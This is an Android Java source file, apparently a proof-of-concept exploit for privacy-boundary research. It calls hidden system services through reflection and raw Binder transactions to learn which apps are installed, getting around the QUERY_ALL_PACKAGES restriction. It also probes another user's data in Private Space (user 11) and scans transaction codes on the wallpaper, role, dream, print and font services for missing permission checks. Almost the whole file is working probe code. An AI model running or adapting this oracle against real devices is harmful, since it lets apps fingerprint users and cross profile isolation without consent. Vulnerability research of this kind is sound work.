package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class AppOracleProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        // GameManager TX=1: getAvailableGameModes(packageName, userId)
        // If a package is NOT installed, we get different response than if it IS installed
        // This is an app-installation oracle bypassing QUERY_ALL_PACKAGES
        testGameManagerOracle(cursor);

        // Also test: RoleManager - TX codes might leak which apps hold which roles
        testRoleManager(cursor);

        // DreamManager - which screen savers are installed
        testDreamManager(cursor);

        // WallpaperManager - cross-user wallpaper access
        testWallpaperManager(cursor);

        // PrintManager - list available print services (reveals installed printer apps)
        testPrintManager(cursor);

        // FontManager - accessible without permission?
        testFontManager(cursor);

        return cursor;
    }

    private void testGameManagerOracle(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("game");
        if (binder == null) { cursor.addRow(new Object[]{"game", "no_binder"}); return; }
        String desc = "android.app.IGameManagerService";

        // Test app installation oracle via GameManager
        // TX=1: getAvailableGameModes(String packageName, int userId)
        // Hypothesis: installed apps return specific modes, non-installed return empty/error
        String[] packages = {
            // Known installed (system)
            "com.android.settings",
            "com.google.android.gms",
            "com.android.systemui",
            // Likely installed (Pixel)
            "com.google.android.apps.photos",
            "com.google.android.youtube",
            "com.google.android.apps.maps",
            // Probably NOT installed
            "com.facebook.katana",
            "com.whatsapp",
            "com.tiktok.android",
            "com.instagram.android",
            "org.telegram.messenger",
            "com.spotify.music",
            // Definitely not installed (fake)
            "com.fake.nonexistent.app",
            "com.definitely.not.installed.xyz"
        };

        for (String pkg : packages) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(pkg);
                data.writeInt(0); // userId 0
                binder.transact(1, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    if (avail >= 4) {
                        int arrLen = reply.readInt();
                        if (arrLen > 0) {
                            StringBuilder sb = new StringBuilder();
                            for (int i = 0; i < Math.min(arrLen, 5); i++) {
                                sb.append(reply.readInt()).append(",");
                            }
                            cursor.addRow(new Object[]{"game_" + shortPkg(pkg), "INSTALLED modes=" + sb});
                        } else {
                            cursor.addRow(new Object[]{"game_" + shortPkg(pkg), "INSTALLED modes=empty"});
                        }
                    } else {
                        cursor.addRow(new Object[]{"game_" + shortPkg(pkg), "SUCCESS_NO_DATA"});
                    }
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"game_" + shortPkg(pkg), "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"game_" + shortPkg(pkg), "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }

        // Cross-user oracle: check Private Space (user 11)
        for (String pkg : new String[]{"com.android.settings", "com.fake.nonexistent.app"}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(pkg);
                data.writeInt(11); // Private Space userId
                binder.transact(1, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"game_u11_" + shortPkg(pkg), "SUCCESS avail=" + avail});
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"game_u11_" + shortPkg(pkg), "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"game_u11_" + shortPkg(pkg), "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=5: getGameModeInfo(String packageName, int userId) - might leak more
        for (String pkg : new String[]{"com.android.settings", "com.fake.nonexistent.app", "com.google.android.apps.photos"}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(pkg);
                data.writeInt(0);
                binder.transact(5, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"gameinfo_" + shortPkg(pkg), "SUCCESS avail=" + avail});
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"gameinfo_" + shortPkg(pkg), "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"gameinfo_" + shortPkg(pkg), "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testRoleManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("role");
        if (binder == null) { cursor.addRow(new Object[]{"role", "no_binder"}); return; }
        String desc = "android.app.role.IRoleManager";

        // TX=1: isRoleAvailable(String roleName)
        String[] roles = {"android.app.role.BROWSER", "android.app.role.DIALER", "android.app.role.SMS",
                          "android.app.role.HOME", "android.app.role.ASSISTANT"};
        for (String role : roles) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(role);
                binder.transact(1, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int available = reply.readInt();
                    cursor.addRow(new Object[]{"role_avail_" + role.substring(role.lastIndexOf('.') + 1), "avail=" + available});
                } else {
                    cursor.addRow(new Object[]{"role_avail_" + role.substring(role.lastIndexOf('.') + 1), "Ex=" + ex});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"role_avail_" + role.substring(role.lastIndexOf('.') + 1), "ERR"});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=3: getRoleHoldersAsUser(String roleName, int userId)
        for (int userId : new int[]{0, 11}) {
            for (String role : new String[]{"android.app.role.BROWSER", "android.app.role.SMS"}) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(desc);
                    data.writeString(role);
                    data.writeInt(userId);
                    binder.transact(3, data, reply, 0);
                    int ex = reply.readInt();
                    if (ex == 0) {
                        int avail = reply.dataAvail();
                        cursor.addRow(new Object[]{"roleHolder_u" + userId + "_" + role.substring(role.lastIndexOf('.') + 1),
                            "SUCCESS avail=" + avail});
                        // Try to read the list
                        if (avail > 4) {
                            int count = reply.readInt();
                            if (count > 0 && count < 50) {
                                StringBuilder sb = new StringBuilder();
                                for (int i = 0; i < Math.min(count, 5); i++) {
                                    String s = reply.readString();
                                    sb.append(s).append(",");
                                }
                                cursor.addRow(new Object[]{"roleHolder_data_u" + userId, sb.toString()});
                            }
                        }
                    } else {
                        String msg = reply.readString();
                        cursor.addRow(new Object[]{"roleHolder_u" + userId + "_" + role.substring(role.lastIndexOf('.') + 1),
                            "Ex=" + ex + "|" + truncate(msg)});
                    }
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"roleHolder_u" + userId + "_" + role.substring(role.lastIndexOf('.') + 1),
                        "ERR:" + e.getClass().getSimpleName()});
                }
                data.recycle();
                reply.recycle();
            }
        }
    }

    private void testDreamManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("dreams");
        if (binder == null) { cursor.addRow(new Object[]{"dreams", "no_binder"}); return; }
        String desc = "android.service.dreams.IDreamManager";

        // Scan TX codes
        for (int tx = 1; tx <= 12; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (!result) {
                    cursor.addRow(new Object[]{"dream_tx" + tx, "NO_SUCH_TX"});
                } else {
                    int ex = reply.readInt();
                    if (ex == 0) {
                        cursor.addRow(new Object[]{"dream_tx" + tx, "SUCCESS avail=" + reply.dataAvail()});
                    } else {
                        String msg = reply.readString();
                        cursor.addRow(new Object[]{"dream_tx" + tx, "Ex=" + ex + "|" + truncate(msg)});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"dream_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testWallpaperManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("wallpaper");
        if (binder == null) { cursor.addRow(new Object[]{"wallpaper", "no_binder"}); return; }
        String desc = "android.app.IWallpaperManager";

        // TX=1: setWallpaper - skip (destructive)
        // TX=2: getWallpaper(String callingPkg, IWallpaperManagerCallback cb, int which,
        //        Bundle outParams, int wallpaperUserId, int displayId)
        // Try getting wallpaper for different users
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeStrongBinder(new android.os.Binder()); // callback
                data.writeInt(1); // FLAG_SYSTEM
                data.writeInt(-1); // null Bundle outParams
                data.writeInt(userId);
                data.writeInt(0); // displayId
                binder.transact(2, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"wallpaper_get_u" + userId, "SUCCESS avail=" + avail});
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"wallpaper_get_u" + userId, "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"wallpaper_get_u" + userId, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=6: getWallpaperInfo(int userId) - exposes which wallpaper app is active
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                binder.transact(6, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"wallpaper_info_u" + userId, "SUCCESS avail=" + avail});
                    if (avail > 4) {
                        int nonNull = reply.readInt();
                        if (nonNull != 0) {
                            // WallpaperInfo contains ComponentName
                            // read embedded ServiceInfo
                            cursor.addRow(new Object[]{"wallpaper_info_u" + userId + "_detail", "HAS_INFO remaining=" + reply.dataAvail()});
                        }
                    }
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"wallpaper_info_u" + userId, "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"wallpaper_info_u" + userId, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }

        // Scan other TX codes
        for (int tx = 3; tx <= 15; tx++) {
            if (tx == 6) continue;
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (!result) {
                    cursor.addRow(new Object[]{"wallpaper_tx" + tx, "NO_SUCH_TX"});
                } else {
                    int ex = reply.readInt();
                    if (ex == 0) {
                        cursor.addRow(new Object[]{"wallpaper_tx" + tx, "SUCCESS avail=" + reply.dataAvail()});
                    } else {
                        String msg = reply.readString();
                        cursor.addRow(new Object[]{"wallpaper_tx" + tx, "Ex=" + ex + "|" + truncate(msg)});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"wallpaper_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testPrintManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("print");
        if (binder == null) { cursor.addRow(new Object[]{"print", "no_binder"}); return; }
        String desc = "android.print.IPrintManager";

        // TX=1: getPrintJobInfos(String pkg, int appId, int userId)
        // TX=5: getInstalledPrintServices(int userId) - reveals installed print apps
        for (int tx : new int[]{1, 5, 6, 7, 8}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0);
                data.writeInt(0); // userId
                boolean result = binder.transact(tx, data, reply, 0);
                if (!result) {
                    cursor.addRow(new Object[]{"print_tx" + tx, "NO_SUCH_TX"});
                } else {
                    int ex = reply.readInt();
                    if (ex == 0) {
                        int avail = reply.dataAvail();
                        cursor.addRow(new Object[]{"print_tx" + tx, "SUCCESS avail=" + avail});
                    } else {
                        String msg = reply.readString();
                        cursor.addRow(new Object[]{"print_tx" + tx, "Ex=" + ex + "|" + truncate(msg)});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"print_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testFontManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("font");
        if (binder == null) { cursor.addRow(new Object[]{"font", "no_binder"}); return; }
        String desc = "com.android.internal.graphics.fonts.IFontManager";

        // Scan TX codes - FontManager might be completely open
        for (int tx = 1; tx <= 5; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (!result) {
                    cursor.addRow(new Object[]{"font_tx" + tx, "NO_SUCH_TX"});
                } else {
                    int ex = reply.readInt();
                    if (ex == 0) {
                        int avail = reply.dataAvail();
                        cursor.addRow(new Object[]{"font_tx" + tx, "SUCCESS avail=" + avail});
                    } else {
                        String msg = reply.readString();
                        cursor.addRow(new Object[]{"font_tx" + tx, "Ex=" + ex + "|" + truncate(msg)});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"font_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private String shortPkg(String pkg) {
        String[] parts = pkg.split("\\.");
        return parts[parts.length - 1];
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
